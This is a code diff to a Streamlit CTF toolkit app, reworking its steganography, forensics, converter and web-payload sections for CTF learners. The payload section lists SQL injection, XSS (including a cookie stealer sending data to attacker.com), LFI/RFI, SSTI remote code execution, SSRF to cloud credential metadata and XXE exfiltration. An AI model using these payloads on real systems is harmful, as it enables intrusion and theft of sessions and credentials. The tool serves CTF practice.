+            st.link_button("Try CrackStation (free, huge database)", "https://crackstation.net/", use_container_width=True)
+
+    # ── STEGANOGRAPHY ───────────────────────────────────────────────────
+    elif tool == "🖼️ Steganography":
+        st.markdown("""
+**Steganography = hiding data inside files.** In CTFs this almost always means a secret message hidden inside an image.
+
+**Where to start:**
+1. Upload the image here to preview it
+2. Try [Aperisolve](https://aperisolve.com) first — it's the easiest online tool and runs everything automatically
+3. If that doesn't work, use the terminal commands below (on Kali Linux or any Linux system)
+
+**Signs that an image might have hidden data:**
+- The file size is suspiciously large for its dimensions
+- There's a password hint somewhere in the challenge
+- The image looks slightly off or has weird colors
+        """)
+        steg_f = st.file_uploader("Upload the image (optional preview)", type=["jpg","png","bmp","gif","tiff"], key="steg_f")
         if steg_f:
-            st.image(io.BytesIO(steg_f.getvalue()), width=220)
+            st.image(io.BytesIO(steg_f.getvalue()), width=300)
 
-        st.markdown("#### Tool Checklist")
-        tools = [
-            ("1️⃣ Check file type", f"`file {fname}`", "Always start here — extension can lie."),
-            ("2️⃣ Strings dump", f"`strings {fname} | grep -iE 'flag|key|pass|CTF'`", "Quick win for plaintext flags."),
-            ("3️⃣ Binwalk", f"`binwalk -e {fname}`", "Extracts embedded files (ZIP, PNG, ELF…)."),
-            ("4️⃣ Steghide", f'`steghide extract -sf {fname} -p ""`', "Common LSB stego tool. Try empty passphrase first."),
-            ("5️⃣ zsteg (PNG/BMP)", f"`zsteg -a {fname}`", "Best for PNG bit-plane analysis."),
-            ("6️⃣ exiftool", f"`exiftool {fname}`", "Check metadata for hidden comments/GPS/author."),
-            ("7️⃣ StegSolve", "GUI tool — run locally", "Bit-plane viewer. Download from GitHub: *Caesum/StegSolve*."),
-            ("8️⃣ Aperisolve", "→ [aperisolve.com](https://aperisolve.com)", "Online all-in-one: zsteg + steghide + binwalk + strings."),
-        ]
-        for title, cmd, tip in tools:
-            st.markdown(f"""<div class='result-card'>
-              <b>{title}</b><br>
-              <span style='font-family:"Share Tech Mono",monospace;font-size:0.8rem;color:#00e5ff;'>{cmd}</span><br>
-              <span style='color:rgba(160,200,240,0.6);font-size:0.78rem;'>{tip}</span>
-            </div>""", unsafe_allow_html=True)
+        st.link_button("🌐 Try Aperisolve first (easiest, free, online)", "https://aperisolve.com", use_container_width=True)
+        st.markdown("**Or run these in your terminal (Kali Linux):**")
+        st.code("""# Step 1 — check the real file type (don't trust the extension)
+file image.png
 
-        st.markdown("#### 🌐 Online Tools")
-        c1, c2, c3 = st.columns(3)
-        c1.link_button("Aperisolve", "https://aperisolve.com", use_container_width=True)
-        c2.link_button("StegOnline", "https://stegonline.georgeom.net/upload", use_container_width=True)
-        c3.link_button("FotoForensics", "https://fotoforensics.com", use_container_width=True)
+# Step 2 — look for readable text with "flag" in it
+strings image.png | grep -iE 'flag|ctf|key|secret'
 
-    # ── Web Exploitation ─────────────────────────────────────
-    elif ctf_tab == "💉 Web Exploitation Payloads":
-        wcat = st.radio("Category", ["SQL Injection","XSS","LFI/RFI","SSTI","SSRF","XXE"], horizontal=True)
+# Step 3 — check for embedded files inside the image
+binwalk -e image.png
+
+# Step 4 — try steghide (works on JPGs, needs a password — try empty "")
+steghide extract -sf image.jpg -p ""
+
+# Step 5 — zsteg for PNG hidden data
+zsteg -a image.png
+
+# Step 6 — check EXIF metadata
+exiftool image.png""", language="bash")
+
+    # ── WEB PAYLOADS ────────────────────────────────────────────────────
+    elif tool == "💉 Web Payloads":
+        st.markdown("""
+**These are common attack payloads used in web CTF challenges.**
+Only use these on systems you own or have permission to test.
+
+Pick a category to see ready-to-use payloads you can copy and try.
+        """)
+        warn("For authorized testing and CTF challenges only.")
+        wcat = st.radio("Category:", ["SQL Injection", "XSS", "LFI/RFI", "SSTI", "SSRF", "XXE"], horizontal=True, key="wcat")
         payloads = {
-            "SQL Injection": [
-                ("Basic bypass", "' OR '1'='1' --"),
-                ("Comment bypass", "admin'--"),
-                ("UNION columns probe", "' UNION SELECT NULL--  (increment NULLs until no error)"),
-                ("Extract tables (MySQL)", "' UNION SELECT table_name,NULL FROM information_schema.tables--"),
-                ("Extract columns", "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"),
-                ("Extract data", "' UNION SELECT username,password FROM users--"),
-                ("Blind (boolean)", "' AND 1=1--  vs  ' AND 1=2--"),
-                ("Time-based blind", "'; IF(1=1) WAITFOR DELAY '0:0:3'--"),
-            ],
-            "XSS": [
-                ("Basic", "<script>alert(document.cookie)</script>"),
-                ("IMG onerror", "<img src=x onerror=alert(1)>"),
-                ("SVG", "<svg onload=alert(1)>"),
-                ("Bypass filter", "<ScRiPt>alert(1)</ScRiPt>"),
-                ("JS URI", "javascript:alert(1)"),
-                ("Data URI", '<a href="data:text/html,<script>alert(1)</script>">click</a>'),
-                ("Cookie steal", '<script>fetch("https://attacker.com/?c="+document.cookie)</script>'),
-            ],
-            "LFI/RFI": [
-                ("Basic LFI", "?page=../../../../etc/passwd"),
-                ("Null byte (old PHP)", "?page=../../../../etc/passwd%00"),
-                ("PHP filter base64", "?page=php://filter/convert.base64-encode/resource=index.php"),
-                ("Log poisoning setup", "Include malicious input in User-Agent, then include /var/log/apache2/access.log"),
-                ("RFI", "?page=http://attacker.com/shell.txt"),
-            ],
-            "SSTI": [
-                ("Detect (Jinja2)", "{{7*7}}  → expect 49"),
-                ("Jinja2 RCE", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
-                ("Twig", "{{7*'7'}}  → 49 = Twig, 7777777 = Jinja2"),
-                ("FreeMarker", "${7*7}"),
-                ("Velocity", "#set($x=7*7)$x"),
-            ],
-            "SSRF": [
-                ("Internal probe", "http://127.0.0.1:80/admin"),
-                ("AWS metadata", "http://169.254.169.254/latest/meta-data/"),
-                ("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/"),
-                ("Bypass filter", "http://0177.0.0.1/  or  http://[::1]/"),
-                ("DNS rebinding", "Use rebind.it or similar tool"),
-            ],
-            "XXE": [
-                ("Classic", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
-                ("Blind OOB", '<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;'),
-                ("PHP filter", 'SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"'),
-            ],
+            "SQL Injection": """-- Basic login bypass
+' OR '1'='1' --
+admin'--
+
+-- Find number of columns (keep going until error)
+' ORDER BY 1--
+' ORDER BY 2--
+
+-- Extract data (MySQL)
+' UNION SELECT NULL,username,password FROM users--
+
+-- Blind: check if vulnerable
+' AND 1=1--   (true, page loads normally)
+' AND 1=2--   (false, page changes)
+
+-- Time-based blind
+' AND SLEEP(5)--""",
+            "XSS": """<!-- Basic -->
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+<!-- Cookie stealer -->
+<script>fetch('https://attacker.com/?c='+document.cookie)</script>
+
+<!-- Filter bypasses -->
+<ScRiPt>alert(1)</ScRiPt>
+javascript:alert(1)""",
+            "LFI/RFI": """../../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+
+# Read PHP source via filter
+php://filter/convert.base64-encode/resource=index.php
+
+# Remote include (if enabled)
+?page=http://attacker.com/shell.txt""",
+            "SSTI": """# Test: does the server evaluate math?
+{{7*7}}   → should show 49 if vulnerable
+
+# Jinja2 RCE
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# Twig RCE
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}""",
+            "SSRF": """# Internal admin panels
+http://127.0.0.1:8080/admin
+http://localhost:22
+
+# AWS metadata endpoint
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# IP bypass (127.0.0.1 as decimal)
+http://2130706433/""",
+            "XXE": """<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+<!-- Blind XXE -->
+<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;""",
         }
-        for label, payload in payloads.get(wcat, []):
-            st.markdown(f"""<div class='result-card'>
-              <b style='color:rgba(180,210,240,0.8);'>{label}</b><br>
-              <code style='word-break:break-all;'>{payload}</code>
-            </div>""", unsafe_allow_html=True)
-        st.markdown("**Practice labs →**")
-        lc1, lc2, lc3 = st.columns(3)
-        lc1.link_button("HackTheBox", "https://app.hackthebox.com/challenges", use_container_width=True)
-        lc2.link_button("PicoCTF", "https://picoctf.org/", use_container_width=True)
-        lc3.link_button("PortSwigger", "https://portswigger.net/web-security", use_container_width=True)
+        st.code(payloads[wcat])
 
-    # ── Forensics & Volatility ────────────────────────────────
-    elif ctf_tab == "🔬 Forensics & Volatility":
-        fcat = st.radio("Category", ["File Carving","PCAP","Memory (Volatility 3)","Disk"], horizontal=True)
-        fcommands = {
-            "File Carving": [
-                ("Detect file type", "file suspicious_file"),
-                ("Foremost (carve all)", "foremost -i disk.img -o output/"),
-                ("Scalpel", "scalpel disk.img -o carved/"),
-                ("PhotoRec (GUI)", "photorec disk.img"),
-                ("Extract ZIPs from binary", "binwalk -e --dd='zip:zip' file.bin"),
-            ],
-            "PCAP": [
-                ("HTTP objects", "tshark -r cap.pcap --export-objects http,./out/"),
-                ("Follow TCP stream", "tshark -r cap.pcap -q -z follow,tcp,ascii,0"),
-                ("Extract creds", "tshark -r cap.pcap -Y 'http.request.method==POST' -T fields -e http.file_data"),
-                ("DNS queries", "tshark -r cap.pcap -Y dns -T fields -e dns.qry.name"),
-                ("Find flag string", "strings cap.pcap | grep -iE 'flag|CTF\\{|picoCTF'"),
-                ("Wireshark filter (GUI)", "tcp contains 'flag'  or  http.request"),
-            ],
-            "Memory (Volatility 3)": [
-                ("Image info", "python3 vol.py -f mem.dmp windows.info"),
-                ("Process list", "python3 vol.py -f mem.dmp windows.pslist"),
-                ("Process tree", "python3 vol.py -f mem.dmp windows.pstree"),
-                ("Network conns", "python3 vol.py -f mem.dmp windows.netstat"),
-                ("Dump process", "python3 vol.py -f mem.dmp windows.dumpfiles --pid 1234"),
-                ("Registry hives", "python3 vol.py -f mem.dmp windows.registry.hivelist"),
-                ("Cmdline args", "python3 vol.py -f mem.dmp windows.cmdline"),
-                ("Malfind (injected)", "python3 vol.py -f mem.dmp windows.malfind"),
-            ],
-            "Disk": [
-                ("Mount image", "sudo mount -o loop,ro disk.img /mnt/disk"),
-                ("List partitions", "fdisk -l disk.img  or  mmls disk.img"),
-                ("Autopsy (GUI)", "autopsy  # browser-based GUI at localhost:9999"),
-                ("Strings search", "strings -a disk.img | grep -iE 'flag|password|secret'"),
-                ("Recover deleted (ext4)", "extundelete disk.img --restore-all"),
-            ],
-        }
-        for label, cmd in fcommands.get(fcat, []):
-            st.markdown(f"""<div class='result-card'>
-              <b style='color:rgba(180,210,240,0.8);'>{label}</b><br>
-              <code style='word-break:break-all;font-size:0.8rem;'>{cmd}</code>
-            </div>""", unsafe_allow_html=True)
+    # ── FORENSICS ───────────────────────────────────────────────────────
+    elif tool == "🔬 Forensics & PCAP":
+        st.markdown("""
+**Forensics challenges give you files to analyze** — disk images, memory dumps, or network captures (.pcap files).
+The goal is usually to find a hidden file, recover deleted data, or read network traffic.
 
-    # ── Reverse Engineering ───────────────────────────────────
-    elif ctf_tab == "⚙️ Reverse Engineering":
-        recat = st.radio("Category", ["Static Analysis","Dynamic / GDB","Ghidra Tips","Python / Script RE"], horizontal=True)
-        recmds = {
-            "Static Analysis": [
-                ("File type", "file ./binary"),
-                ("Strings", "strings ./binary | grep -iE 'flag|key|pass|CTF'"),
-                ("Symbols", "nm -an ./binary  or  readelf -s ./binary"),
-                ("Sections", "readelf -S ./binary"),
-                ("Disassemble (objdump)", "objdump -d -M intel ./binary | less"),
-                ("Imports/exports", "objdump -p ./binary | grep -i import"),
-                ("Security mitigations", "checksec --file=./binary"),
-                ("Detect packers", "upx -t ./binary  or  Detect-It-Easy (DIE)"),
-            ],
-            "Dynamic / GDB": [
-                ("Run with GDB", "gdb ./binary"),
-                ("Disassemble main", "(gdb) disas main"),
-                ("Set breakpoint", "(gdb) b *0x401234  or  b main"),
-                ("Run / continue", "(gdb) r args    (gdb) c"),
-                ("Print register", "(gdb) info registers  or  p $rax"),
-                ("Examine memory", "(gdb) x/32xw $esp"),
-                ("Pattern for overflow", "(gdb) pattern create 200   →   run   →   pattern offset $pc"),
-                ("ltrace / strace", "ltrace ./binary   strace ./binary"),
-            ],
-            "Ghidra Tips": [
-                ("Import & analyze", "File → Import File → Analysis → Auto Analyze"),
-                ("Find main", "Symbol Tree → Functions → main"),
-                ("Rename variable", "Right-click → Rename Variable (L)"),
-                ("Patch instruction", "Right-click → Patch Instruction"),
-                ("Script runner", "Window → Script Manager → run Python scripts"),
-                ("Decompiler", "Right-click in listing → Decompile (Ctrl+E)"),
-                ("Export C", "File → Export Program → C/C++ format"),
-            ],
-            "Python / Script RE": [
-                ("Unpack Base64 layers", "import base64; d=base64.b64decode(data)"),
-                ("Brute XOR key", "for k in range(256): print(bytes([b^k for b in data]))"),
-                ("pwntools template", "from pwn import *\np=process('./binary')\np.sendline(b'A'*64+p64(0xdeadbeef))\np.interactive()"),
-                ("Frida hook (Android)", "frida -U -l hook.js com.target.app"),
-                ("angr symbolic exec", "import angr; p=angr.Project('./bin'); sim=p.factory.simgr(); sim.explore(find=0xaddr)"),
-            ],
-        }
-        for label, cmd in recmds.get(recat, []):
-            st.markdown(f"""<div class='result-card'>
-              <b style='color:rgba(180,210,240,0.8);'>{label}</b><br>
-              <code style='word-break:break-all;font-size:0.8rem;'>{cmd}</code>
-            </div>""", unsafe_allow_html=True)
-        st.markdown("**Resources →**")
-        rc1, rc2, rc3 = st.columns(3)
-        rc1.link_button("Ghidra", "https://ghidra-sre.org", use_container_width=True)
-        rc2.link_button("pwntools docs", "https://docs.pwntools.com", use_container_width=True)
-        rc3.link_button("CTF101 guide", "https://ctf101.org", use_container_width=True)
+**What you'll need:** Kali Linux (or any Linux) with `binwalk`, `foremost`, `tshark`, and `volatility` installed.
+        """)
+        ftool = st.radio("What are you working with?", ["PCAP (network capture)", "Disk image", "Memory dump"], horizontal=True, key="ftool")
+        if ftool == "PCAP (network capture)":
+            st.code("""# Open in Wireshark (GUI)
+wireshark capture.pcap
 
-# ========== TAB 6: Deep File Scan ==========
-with tab6:
-    st.markdown("### 🔬 Deep File Scan")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Extract strings, entropy heatmap, embedded file signatures, and flag patterns from any file.</p>", unsafe_allow_html=True)
-    deep_file = st.file_uploader("Choose a file", type=["jpg","png","gif","bmp","pdf","zip","tar","bin","elf","exe","docx"], key="deep")
-    if deep_file:
-        file_bytes = deep_file.getvalue()
-        fname = deep_file.name
-        fsize = len(file_bytes)
-        
-        st.markdown(f"""
-        <div class='glass-card'>
-            <b>📄 Name:</b> {fname}<br>
-            <b>📏 Size:</b> {fsize//1024} KB<br>
-            <b>🔐 MD5:</b> <code>{hashlib.md5(file_bytes).hexdigest()}</code><br>
-            <b>🔐 SHA256:</b> <code>{hashlib.sha256(file_bytes).hexdigest()[:32]}…</code>
-        </div>
-        """, unsafe_allow_html=True)
-        
-        if HAS_MAGIC:
+# See all HTTP requests in terminal
+tshark -r capture.pcap -Y "http.request"
+
+# Follow a TCP conversation
+tshark -r capture.pcap -q -z follow,tcp,ascii,0
+
+# Export HTTP files (images, downloads, etc.)
+tshark -r capture.pcap --export-objects http,./output/
+
+# Search for the flag directly
+strings capture.pcap | grep -iE 'CTF\\{|flag\\{'""", language="bash")
+        elif ftool == "Disk image":
+            st.code("""# Carve all recoverable files
+foremost -i disk.img -o output/
+
+# Find embedded files and extract them
+binwalk -e disk.img
+
+# Mount the image to browse files (Linux)
+mkdir /mnt/disk
+mount -o loop disk.img /mnt/disk
+ls /mnt/disk
+
+# Search all files for the flag
+grep -r 'CTF{' /mnt/disk 2>/dev/null""", language="bash")
+        elif ftool == "Memory dump":
+            st.code("""# List running processes
+python3 vol.py -f memory.dump windows.pslist
+
+# See what commands were run
+python3 vol.py -f memory.dump windows.cmdline
+
+# Dump a suspicious process (replace 1234 with the PID)
+python3 vol.py -f memory.dump windows.dumpfiles --pid 1234
+
+# Extract password hashes
+python3 vol.py -f memory.dump windows.hashdump
+
+# Scan for strings
+strings memory.dump | grep -iE 'CTF\\{|flag\\{'""", language="bash")
+
+    # ── NUMBER BASE CONVERTER ───────────────────────────────────────────
+    elif tool == "🔢 Number Base Converter":
+        st.markdown("""
+**Convert between number bases and ASCII text.** Useful when a CTF challenge gives you a strange-looking number.
+
+Just type anything — a decimal number, hex value, or plain text — and we'll convert it.
+        """)
+        num_in = st.text_input("Enter a number or text:", placeholder="72  or  48656c6c6f  or  Hello", key="num_in")
+        if num_in and num_in.strip():
+            v = num_in.strip()
             try:
-                mime = magic.from_buffer(file_bytes[:2048])
-                st.markdown(f"**📌 Type:** `{mime}`")
-            except:
-                pass
-        
-        if fsize > 0:
-            freq = Counter(file_bytes)
-            probs = [freq[b]/fsize for b in freq]
-            entropy = -sum(p * math.log2(p) for p in probs if p > 0)
-            st.markdown(f"**📊 Entropy:** {entropy:.2f} bits/byte (high → encrypted/compressed)")
-            
-            st.markdown("**📈 Entropy heatmap (64 blocks)**")
-            block_size = max(1, fsize//64)
-            entropies = []
-            for i in range(0, fsize, block_size):
-                block = file_bytes[i:i+block_size]
-                if block:
-                    fq = Counter(block)
-                    pv = [fq[b]/len(block) for b in fq]
-                    e = -sum(p * math.log2(p) for p in pv if p>0) if len(block) > 0 else 0
-                    entropies.append(e)
-            cols = st.columns(min(64, len(entropies)))
-            for idx, e in enumerate(entropies[:64]):
-                color = f"hsl({int(240 - e*120)}, 80%, 50%)"
-                cols[idx].markdown(f"<div style='background:{color}; height:24px; width:100%; border-radius:6px;' title='{e:.2f}'></div>", unsafe_allow_html=True)
-        
-        with st.expander("🔤 Extracted ASCII strings (first 2000 chars)"):
-            strings = re.findall(b'[\\x20-\\x7E]{4,}', file_bytes)
-            unique = list(set(s.decode('ascii', errors='ignore') for s in strings))[:100]
-            st.code('\n'.join(unique[:50]))
-        
-        with st.expander("🗂️ Embedded file signatures"):
-            sigs = {
-                b'PK\x03\x04': 'ZIP archive',
-                b'\x89PNG\r\n\x1a\n': 'PNG image',
-                b'\xff\xd8\xff': 'JPEG image',
-                b'%PDF': 'PDF document',
-                b'\x7fELF': 'ELF executable',
-                b'MZ': 'PE executable',
-                b'GIF8': 'GIF image',
-                b'RIFF': 'RIFF container (AVI/WAV)',
-                b'OggS': 'Ogg stream',
-                b'FLIF': 'FLIF image',
-                b'\x1f\x8b': 'GZIP archive',
-                b'BZ': 'BZIP2 archive',
-                b'7z\xbc\xaf\x27\x1c': '7-Zip archive',
-                b'Rar!': 'RAR archive',
-                b'<!DOCTYPE html': 'HTML document',
-            }
-            found = []
-            for sig, desc in sigs.items():
-                idx = file_bytes.find(sig)
-                if idx != -1:
-                    found.append(f"- {desc} at offset {idx}")
-            if found:
-                st.markdown('\n'.join(found))
-            else:
-                st.markdown("No common embedded headers detected.")
-        
-        with st.expander("🏴 Flag pattern search"):
-            patterns = [
-                r'flag\{[^}]+\}', r'FLAG\{[^}]+\}', r'ctf\{[^}]+\}',
-                r'key\{[^}]+\}', r'secret\{[^}]+\}', r'password\{[^}]+\}',
-                r'[A-Za-z0-9]{32}', r'[A-F0-9]{32}', r'[a-f0-9]{64}'
-            ]
-            matches = []
-            for pat in patterns:
-                found = re.findall(pat.encode(), file_bytes, re.IGNORECASE)
-                matches.extend([f.decode(errors='ignore') for f in found])
-            if matches:
-                st.success("✅ Potential flags found:")
-                for m in set(matches):
-                    st.code(m)
-            else:
-                st.info("No obvious flag patterns found.")
-        
-        with st.expander("🕵️ Steganography commands to try locally"):
-            st.code(f"""
-steghide extract -sf {fname} -p ""
-zsteg -a {fname}
-binwalk -e {fname}
-strings {fname} | grep -iE 'flag|secret'
-            """)
-        
-        st.download_button("📥 Download extracted strings", "\n".join(unique[:500]), file_name="strings.txt", mime="text/plain")
-
-# ========== TAB 7: Network Recon ==========
-with tab7:
-    st.markdown("### 🌐 Network Reconnaissance")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>DNS records, IP geolocation, port scan, and threat intelligence — all from one query.</p>", unsafe_allow_html=True)
-    target = st.text_input("Target (IP or domain)", placeholder="8.8.8.8 or example.com", key="recon_target")
-    col_a, col_b = st.columns(2)
-    check_ports = col_a.checkbox("Port scan (top 20)", value=False)
-    check_whois = col_b.checkbox("WHOIS lookup", value=True)
-
-    if st.button("🚀 Start Recon", use_container_width=True) and target:
-        t = target.strip()
-        is_ip = bool(re.match(r'^\d{1,3}(\.\d{1,3}){3}$', t))
-
-        # Resolve IP
-        resolved_ip = t if is_ip else None
-        if not is_ip:
-            try:
-                resolved_ip = socket.gethostbyname(t)
-            except:
-                pass
-
-        st.markdown(f"""
-        <div class='glass-card'>
-          <b>🎯 Target:</b> {t}<br>
-          {"<b>🔗 Resolved IP:</b> <code>" + resolved_ip + "</code>" if resolved_ip and not is_ip else ""}
-        </div>""", unsafe_allow_html=True)
-
-        # DNS records
-        st.markdown("#### 🌍 DNS Records")
-        dns_cols = st.columns(2)
-        dns_left = []
-        dns_right = []
-        for rtype in ['A','AAAA','MX','NS','TXT','CNAME','SOA']:
-            try:
-                ans = dns.resolver.resolve(t, rtype, lifetime=4)
-                for rec in ans:
-                    val = str(rec)[:120]
-                    entry = f"<div class='result-card'><code>{rtype}</code> {val}</div>"
-                    (dns_left if len(dns_left) <= len(dns_right) else dns_right).append(entry)
-            except:
-                pass
-        with dns_cols[0]: st.markdown("".join(dns_left), unsafe_allow_html=True)
-        with dns_cols[1]: st.markdown("".join(dns_right), unsafe_allow_html=True)
-
-        # Geolocation
-        if resolved_ip:
-            st.markdown("#### 📍 IP Geolocation")
-            try:
-                geo = requests.get(f"http://ip-api.com/json/{resolved_ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,reverse", timeout=5).json()
-                if geo.get('status') == 'success':
-                    gcols = st.columns(3)
-                    gcols[0].markdown(f"""<div class='glass-card'>
-                        🌍 <b>{geo.get('country')} ({geo.get('countryCode')})</b><br>
-                        📍 {geo.get('city')}, {geo.get('regionName')} {geo.get('zip','')}
-                    </div>""", unsafe_allow_html=True)
-                    gcols[1].markdown(f"""<div class='glass-card'>
-                        🏢 <b>ISP:</b> {geo.get('isp')}<br>
-                        🔧 <b>Org:</b> {geo.get('org')}
-                    </div>""", unsafe_allow_html=True)
-                    gcols[2].markdown(f"""<div class='glass-card'>
-                        📡 <b>ASN:</b> {geo.get('as','?')}<br>
-                        🔁 <b>rDNS:</b> {geo.get('reverse','N/A')}
-                    </div>""", unsafe_allow_html=True)
-                    st.map(data=[{"lat": geo['lat'], "lon": geo['lon']}], zoom=5)
+                if re.fullmatch(r'[0-9a-fA-F]+', v) and not v.isdigit():
+                    n = int(v, 16)
+                    st.markdown(f"**Treating `{v}` as hex:**")
+                    st.markdown(f"- Decimal: `{n}`")
+                    st.markdown(f"- Binary: `{bin(n)}`")
+                    if len(v) % 2 == 0:
+                        st.markdown(f"- ASCII: `{bytes.fromhex(v).decode('utf-8', 'replace')}`")
+                elif v.isdigit():
+                    n = int(v)
+                    st.markdown(f"**Decimal `{n}`:**")
+                    st.markdown(f"- Hex: `{hex(n)}`")
+                    st.markdown(f"- Binary: `{bin(n)}`")
+                    st.markdown(f"- Octal: `{oct(n)}`")
+                    st.markdown(f"- ASCII char: `{chr(n) if 32 <= n <= 126 else '(not printable)'}`")
+                else:
+                    hexed = v.encode().hex()
+                    st.markdown(f"**Text `{v}`:**")
+                    st.markdown(f"- Hex: `{hexed}`")
+                    st.markdown(f"- Decimal bytes: `{' '.join(str(b) for b in v.encode())}`")
+                    st.markdown(f"- Binary: `{' '.join(format(b,'08b') for b in v.encode())}`")
             except Exception as e:
-                st.info(f"Geo lookup failed: {e}")
+                danger(f"Conversion error: {e}")
 
-        # Port scan
-        if check_ports and resolved_ip:
-            st.markdown("#### 🔌 Port Scan (top 20)")
-            TOP_PORTS = [21,22,23,25,53,80,110,143,443,445,3306,3389,5432,6379,8080,8443,8888,9200,27017,6443]
-            open_ports = []
-            prog = st.progress(0)
-            for i, port in enumerate(TOP_PORTS):
-                prog.progress((i+1)/len(TOP_PORTS))
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(0.8)
-                    if s.connect_ex((resolved_ip, port)) == 0:
-                        open_ports.append(port)
-                    s.close()
-                except:
-                    pass
-            prog.empty()
-            SVCMAP = {21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',110:'POP3',
-                      143:'IMAP',443:'HTTPS',445:'SMB',3306:'MySQL',3389:'RDP',5432:'Postgres',
-                      6379:'Redis',8080:'HTTP-Alt',8443:'HTTPS-Alt',8888:'Jupyter',
-                      9200:'Elasticsearch',27017:'MongoDB',6443:'K8s API'}
-            if open_ports:
-                for p in open_ports:
-                    st.markdown(f"<div class='result-card'>🟢 <code>{p}</code> — {SVCMAP.get(p, 'unknown')}</div>", unsafe_allow_html=True)
-            else:
-                st.info("No open ports found in top 20.")
+    # ── XOR DECODER ────────────────────────────────────────────────────
+    elif tool == "🔐 XOR Decoder":
+        st.markdown("""
+**XOR is a simple cipher** where each byte of the message is XOR'd against a key.
 
-        # WHOIS
-        if check_whois and not is_ip:
-            st.markdown("#### 📋 WHOIS")
-            st.link_button("WHOIS Lookup →", f"https://who.is/whois/{t}", use_container_width=False)
-
-        # Threat intel links
-        st.markdown("#### 🛡️ Threat Intelligence")
-        intel_cols = st.columns(4)
-        ref = resolved_ip or t
-        intel_cols[0].link_button("VirusTotal", f"https://www.virustotal.com/gui/{'ip-address' if is_ip else 'domain'}/{ref}", use_container_width=True)
-        intel_cols[1].link_button("Shodan", f"https://www.shodan.io/host/{ref}" if is_ip else f"https://www.shodan.io/search?query=hostname:{t}", use_container_width=True)
-        intel_cols[2].link_button("SecurityTrails", f"https://securitytrails.com/domain/{t}/dns", use_container_width=True)
-        intel_cols[3].link_button("Censys", f"https://search.censys.io/hosts/{ref}" if is_ip else f"https://search.censys.io/certificates?q={t}", use_container_width=True)
-
-        # Subdomain enum commands
-        with st.expander("🔍 Subdomain enumeration commands"):
-            st.code(f"""
-subfinder -d {t} -o subs.txt
-amass enum -passive -d {t}
-dnsrecon -d {t} -t brt -D /usr/share/wordlists/dnsmap.txt
-dnsx -l subs.txt -resp -a -aaaa -mx -ns
-            """)
-
-# ========== TAB 8: Password Intel ==========
-with tab8:
-    st.markdown("### 🔑 Password Intelligence")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Analyze strength, generate hashes, and build targeted wordlists — fully offline.</p>", unsafe_allow_html=True)
-
-    pw_mode = st.radio("Mode", ["Strength Analyzer", "Hash Generator", "Wordlist Builder"], horizontal=True)
-
-    if pw_mode == "Strength Analyzer":
-        pw = st.text_input("Password to analyze", type="password", placeholder="Enter any password")
-        if pw:
-            length = len(pw)
-            has_upper = bool(re.search(r'[A-Z]', pw))
-            has_lower = bool(re.search(r'[a-z]', pw))
-            has_digit = bool(re.search(r'\d', pw))
-            has_sym   = bool(re.search(r'[^A-Za-z0-9]', pw))
-            charset   = (26 if has_lower else 0) + (26 if has_upper else 0) + (10 if has_digit else 0) + (32 if has_sym else 0)
-            entropy   = round(length * math.log2(charset), 1) if charset else 0
-            score     = sum([length >= 8, length >= 12, has_upper, has_lower, has_digit, has_sym])
-            label     = ["Very Weak","Weak","Fair","Good","Strong","Very Strong"][min(score,5)]
-            color     = ["#ff3b30","#ff9500","#ffcc00","#34c759","#007aff","#5856d6"][min(score,5)]
-
-            st.markdown(f"""
-            <div class='glass-card'>
-              <div style='font-family:"Share Tech Mono",monospace;font-size:1.5rem;color:{color};font-weight:700;'>{label}</div>
-              <div style='margin:8px 0;background:rgba(255,255,255,0.06);border-radius:50px;height:8px;overflow:hidden;'>
-                <div style='width:{score/5*100}%;height:100%;background:{color};border-radius:50px;transition:width 0.6s ease;'></div>
-              </div>
-              <b>Length:</b> {length} chars &nbsp;|&nbsp; <b>Entropy:</b> {entropy} bits &nbsp;|&nbsp; <b>Charset:</b> {charset}
-            </div>
-            """, unsafe_allow_html=True)
-
-            checks = [
-                (has_upper, "Uppercase letters"),
-                (has_lower, "Lowercase letters"),
-                (has_digit, "Numbers"),
-                (has_sym,   "Symbols"),
-                (length >= 8,  "At least 8 characters"),
-                (length >= 16, "16+ characters (great)"),
-            ]
-            for ok, label in checks:
-                icon = "✅" if ok else "❌"
-                st.markdown(f"{icon} {label}")
-
-            # Common password check
-            COMMON = {"password","123456","qwerty","letmein","admin","welcome","monkey","dragon","master","sunshine"}
-            if pw.lower() in COMMON:
-                st.error("⚠️ This is one of the most common passwords. Change it immediately.")
-
-    elif pw_mode == "Hash Generator":
-        text = st.text_input("Text to hash", placeholder="hello world")
-        if text:
-            enc = text.encode()
-            hashes = {
-                "MD5":    hashlib.md5(enc).hexdigest(),
-                "SHA-1":  hashlib.sha1(enc).hexdigest(),
-                "SHA-256":hashlib.sha256(enc).hexdigest(),
-                "SHA-512":hashlib.sha512(enc).hexdigest(),
-                "SHA-384":hashlib.sha384(enc).hexdigest(),
-            }
-            for algo, val in hashes.items():
-                st.markdown(f"<div class='result-card'><code>{algo}</code><br><small style='color:#00e5ff;word-break:break-all;'>{val}</small></div>", unsafe_allow_html=True)
